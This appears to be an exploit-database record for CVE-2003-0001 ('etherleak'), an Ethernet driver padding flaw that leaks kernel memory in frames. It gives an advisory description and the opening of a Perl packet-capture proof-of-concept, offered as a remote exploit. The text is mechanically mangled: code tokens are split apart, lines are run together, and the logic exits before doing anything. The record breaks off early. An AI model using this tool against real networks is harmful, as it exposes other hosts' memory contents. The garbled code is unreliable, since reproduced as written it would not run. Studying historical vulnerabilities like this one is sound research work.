    "text": "ecve : CVE-2003-0001 ， title : Linux Kernel 2.0.x/2.2.x/2.4.x ( FreeBSD 4.x ) - Network Device Driver Frame Padding Information Disclosure - BSD remote Exploit ， verified : Verified ， exploit_detail : source :  ， Network device drivers for several vendors have been reported to disclose potentially sensitive information to attackers. ， Frames that are smaller than the minimum frame size should have the unused portion of the frame buffer padded with null ( or other ) bytes. Some device drivers fail to do this adequately , leaving the data that was stored in the memory comprising the buffer prior to its use intact. Consequently , this data may be transmitted within frames across Ethernet segments. Since the Ethernet frame buffer is allocated in kernel memory space , sensitive data may be leaked. ， Cisco has stated that the IOS 12.1 and 12.2 trains are not affected. ， National Semiconductor Ethernet controller chips are not vulnerable to this issue. ，  #  ! /usr/bin/perl -w ，  # etherleak , code that has been 5 years coming. ，  # On 04/27/2002 , I disclosed on the Linux Kernel Mailing list ,  ，  # a vulnerability that would be come known as the 'etherleak' bug. In ，  # various situations an ethernet frame must be padded to reach a specific ，  # size or fall on a certain boundary. This task is left up to the driver ，  # for the ethernet device. The RFCs state that this padding must consist ，  # of NULLs. The bug is that at the time and still to this day , many device ，  # drivers do not pad will NULLs , but rather pad with unsanitized portions ，  # of kernel memory , oftentimes exposing sensitive information to remote ，  # systems or those savvy enough to coerce their targets to do so. ，  # Proof of this can be found by googling for 'warchild and etherleak' , or ，  # by visiting :  ，  # This was ultimately fixed in the Linux kernel , but over time this ，  # vulnerability reared its head numerous times , but at the core the ，  # vulnerability was the same as the one I originally published. The most ，  # public of these was CVE-2003-0001 , which was assigned to address an ，  # official @ stake advisory. ，  # This code can be found its most current form at :  ，  # Jon Hart <jhart @ spoofed.org> , March 2007 ， use strict ;  ， use diagnostics ;  ， use warnings ;  ， use Getopt :  : Long ;  ， use Net :  : Pcap ;  ， use NetPacket :  : Ethernet qw (  : ALL )  ;  ， use NetPacket :  : IP qw (  : ALL )  ;  ， my %opts = (  )  ;  ， my (  $ iface ,  $ err ,  $ pcap_t ,  $ pcap_save ,  $ filter_string )  ;  ， GetOptions ( \\%opts , 'help' , 'filter=s' , 'interface=s' , 'quiet' , 'read=s' , 'write=s' , 'verbose' ) or ， die \"Unknown option :  $  ! \\n\" &usage (  )  ;  ， &usage (  )  ;  ， exit ( 0 )  ;  ，  $ pcap_t = Net :  : Pcap :  : open_offline (  $ opts{'read'} , \\ $ err )  ; ",
